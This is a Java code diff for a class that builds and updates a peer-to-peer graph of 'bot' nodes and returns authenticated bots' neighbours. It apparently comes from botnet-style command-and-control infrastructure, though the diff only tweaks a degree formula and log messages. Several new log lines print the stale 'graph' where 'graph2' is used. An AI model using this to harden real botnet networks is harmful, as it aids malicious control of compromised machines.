@@ -72,8 +72,8 @@ public class P2PMan {
 	 * @return
 	 */
 	private Integer calculateK(Integer nodes) {
-		Integer k = (int) Math.ceil(Math.log10(nodes + 1));
-		if (nodes > 3) {
+		Integer k = (int) Math.ceil(Math.log10(nodes + 10));
+		if (nodes > 2) {
 			k++;
 		}
 		return k;
@@ -87,24 +87,19 @@ public class P2PMan {
 		// creo grafo partenza
 		graph = new ListenableUndirectedGraph<IP, DefaultEdge>(DefaultEdge.class);
 		List<Bot> bots = bServ.findAll();
-		System.out.println("idbot peer to peer");
 
 		ArrayList<IP> nodes = new ArrayList<IP>();
 		bots.forEach(bot -> nodes.add(new IP(bot.getIp())));
-		System.out.println("idbot peer to peer 2");
 
 		MyGnmRandomGraphDispenser<IP, DefaultEdge> g2 = new MyGnmRandomGraphDispenser<IP, DefaultEdge>(nodes.size(), 0,
 				new SecureRandom(), true, false);
-		System.out.println("idbot peer to peer 3");
 		MyVertexFactory<IP> nodeIp = new MyVertexFactory<IP>((List<IP>) nodes.clone(), new SecureRandom());
-		System.out.println("idbot peer to peer 4");
 		g2.generateConnectedGraph(graph, nodeIp, null, calculateK(nodes.size()));
-		System.out.println("idbot peer to peer 5");
 		for (IP ip2 : nodes) {
 			System.out.println("gli archi di  " + graph.degreeOf(ip2));
 		}
-		System.out.println("graph" + graph);
-		System.out.println("gdegree " + calculateK(nodes.size()));
+		System.out.println("create/update graph" + graph);
+		System.out.println("minium degree 4e nodes " + calculateK(nodes.size()));
 		return graph;
 	}
 
@@ -129,8 +124,8 @@ public class P2PMan {
 		for (IP ip2 : nodes) {
 			System.out.println("gli archi di  " + graph2.degreeOf(ip2));
 		}
-		System.out.println("graph" + graph2);
-		System.out.println("gdegree " + calculateK(nodes.size()));
+		System.out.println("create/update graph" + graph);
+		System.out.println("minium degree 4e nodes " + calculateK(nodes.size()));
 		this.graph = graph2;
 		
 		SyncIpList<IP, PublicKey> buf = nServ.getNeighbours();
@@ -160,8 +155,8 @@ public class P2PMan {
 		for (IP ip2 : nodes) {
 			System.out.println("gli archi di  " + graph2.degreeOf(ip2));
 		}
-		System.out.println("graph" + graph2);
-		System.out.println("gdegree " + calculateK(nodes.size()));
+		System.out.println("create/update graph" + graph);
+		System.out.println("minium degree 4e nodes " + calculateK(nodes.size()));
 		this.graph = graph2;
 		SyncIpList<IP, PublicKey> buf = nServ.getNeighbours();
 		buf.setAll(myNeighbours(nServ.getMyIp().getIp()).getList());
@@ -194,8 +189,8 @@ public class P2PMan {
 		for (IP ip2 : nodes) {
 			System.out.println("gli archi di  " + graph2.degreeOf(ip2));
 		}
-		System.out.println("graph" + graph2);
-		System.out.println("gdegree " + calculateK(nodes.size()));
+		System.out.println("create/update graph" + graph);
+		System.out.println("minium degree 4e nodes " + calculateK(nodes.size()));
 		this.graph = graph2;
 		SyncIpList<IP, PublicKey> buf = nServ.getNeighbours();
 		buf.setAll(myNeighbours(nServ.getMyIp().getIp()).getList());
@@ -220,13 +215,13 @@ public class P2PMan {
 		idBot = pki.getCrypto().decryptAES(data);
 		if (idBot == null)
 			return null;
-		System.out.println("id bot " + idBot);
+		System.out.println("decripted get neigh from id bot " + idBot);
 		bot = bServ.searchBotId(idBot);
 
 		if (bot == null) {
 			return null;// non autenticato
 		} else {
-			System.out.println(" bot " + bot.getIp());
+			System.out.println(" Ip of bot who made request " + bot.getIp());
 			if (graph.containsVertex(new IP(bot.getIp()))) {
 				Set<DefaultEdge> neighbours = graph.edgesOf(new IP(bot.getIp()));
 				if (neighbours.size() < calculateK(bServ.findAll().size())) {
